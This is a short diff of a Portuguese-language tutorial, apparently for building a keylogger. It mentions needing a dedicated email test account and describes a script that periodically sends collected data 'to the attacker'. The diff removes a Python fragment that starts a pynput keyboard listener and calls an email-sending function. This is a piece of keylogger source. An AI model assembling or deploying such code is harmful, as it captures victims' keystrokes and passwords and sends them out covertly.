@@ -33,8 +33,3 @@ Nesta etapa iniciamos com um simples movimento: a mudança da extensão do nosso
 
 Inicialmente é preciso de uma conta exclusiva para testes, por questões de segurança. Esta conta será utilizada no teste e deve ser ativada a verificação em 2 (duas) etapas.
 O script a seguir realiza a automação do envio de mensagens periódicas ao atacante com os dados coletados de tempo em tempo.
-
-with keyboard.Listener(on_press=on_press) as listener:
-	enviar_email()
-	listener.join()
-
